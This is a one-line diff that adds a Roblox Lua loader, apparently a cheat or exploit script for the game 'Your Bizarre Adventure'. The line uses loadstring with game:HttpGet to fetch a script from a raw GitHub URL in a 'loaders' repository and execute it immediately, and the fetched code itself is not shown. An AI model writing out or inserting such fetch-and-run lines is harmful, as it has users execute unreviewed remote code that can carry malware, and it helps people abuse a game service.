@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/your-bizarre-adventure-spam3-bjycfwdlo2pcx6.lua"))()
